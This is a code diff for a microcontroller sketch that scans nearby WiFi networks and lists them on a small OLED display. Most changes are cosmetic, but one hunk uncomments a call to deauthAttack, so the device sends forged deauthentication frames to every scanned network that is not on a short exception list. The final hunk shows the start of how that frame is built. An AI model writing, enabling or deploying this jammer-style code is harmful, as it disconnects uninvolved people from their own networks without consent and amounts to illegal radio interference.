@@ -2,17 +2,19 @@
 #include <Wire.h>
 #include <U8g2lib.h>
 #include <string.h>
+
 #define FLASH_BUTTON_PIN 0 // GPIO0 is commonly used for the flash button
 #define ICON_SIZE 16       // Icon size for display
 
-bool flashButtonState = false; // State of the flash button
-bool lastFlashButtonState = false; // Previous state of the flash button
+bool flashButtonState = false;       // State of the flash button
+bool lastFlashButtonState = false;   // Previous state of the flash button
+
 // Define your SSID exception list
 const char* ssid_exception_list[] = {
-    "a",  // Example SSID 1
-    "aaa",  // Example SSID 2
-    "shot8",  // Example SSID 2
-    "shop8",  // Example SSID 2
+    "a",       // Example SSID 1
+    "aaa",     // Example SSID 2
+    "shot8",   // Example SSID 3
+    "shop8",   // Example SSID 4
     // Add more SSIDs as needed
 };
 
@@ -27,6 +29,9 @@ bool isInExceptionList(const char* ssid) {
     }
     return false;  // SSID not found in exception list
 }
+
+// Declare the deauthAttack function
+void deauthAttack(uint8_t* bssid, const char* ssid);
 
 // Initialize the display using software I2C with specified pins
 U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/ 12, /* data=*/ 14, /* reset=*/ U8X8_PIN_NONE);
@@ -69,7 +74,7 @@ void loop(void) {
   if (n == 0) {
     Serial.println("No networks found");
     u8g2.clearBuffer();
-    u8g2.setFont(u8g2_font_u8glib_4_tf  ); // Set a small font (profont10_mr)
+    u8g2.setFont(u8g2_font_u8glib_4_tf); // Set a small font
     u8g2.drawStr(0, 30, "No networks found");
     u8g2.sendBuffer();
   } else {
@@ -81,18 +86,18 @@ void loop(void) {
     u8g2.setFont(u8g2_font_profont10_mr); // Set a small font (profont10_mr)
     for (int i = 0; i < n; ++i) {
       Serial.print(i + 1);
-      Serial.print(":");
+      Serial.print(": ");
       Serial.println(WiFi.SSID(i));
 
       String ssid = WiFi.SSID(i);
-      String ssid1 = WiFi.SSID(i);
-      if (ssid.length() > 16) { // Limit the SSID to 12 characters
-        ssid1 = ssid1.substring(0, 22); // Truncate SSID if longer than 12 characters
+      String ssid_display = ssid;
+      if (ssid.length() > 16) { // Limit the SSID to 16 characters
+        ssid_display = ssid.substring(0, 16); // Truncate SSID if longer than 16 characters
       }
       u8g2.setCursor(0, (i + 1) * 10 + 16);
       u8g2.print(i + 1);
       u8g2.print(": ");
-      u8g2.print(ssid1);
+      u8g2.print(ssid_display);
 
       int32_t rssi = WiFi.RSSI(i);
       u8g2.setCursor(105, (i + 1) * 10 + 16);
@@ -109,8 +114,7 @@ void loop(void) {
       Serial.println();
       
       const char* ssid_char = ssid.c_str();
-      // deauthAttack(bssid, ssid_char);
-
+      deauthAttack(bssid, ssid_char);
 
       if (i == 3) break; // Only display the first 3 networks to fit the screen
     }
@@ -125,6 +129,7 @@ void deauthAttack(uint8_t* bssid, const char* ssid) {
       // SSID is in the exception list, do not send deauthentication packets
       return;
   }
+
   // Frame construction for deauthentication
   uint8_t deauthPacket[26] = {
     0xC0, 0x00,             // Frame Control: Deauthentication
